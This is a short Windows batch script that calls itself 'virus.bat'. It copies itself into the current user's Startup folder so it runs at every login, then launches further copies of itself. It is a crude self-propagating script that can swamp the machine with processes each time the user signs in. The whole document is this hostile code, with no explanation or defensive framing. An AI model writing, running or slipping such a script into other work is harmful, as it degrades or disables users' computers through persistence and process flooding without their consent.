@echo off
xcopy /y "virus.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" virus.bat
start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" virus.bat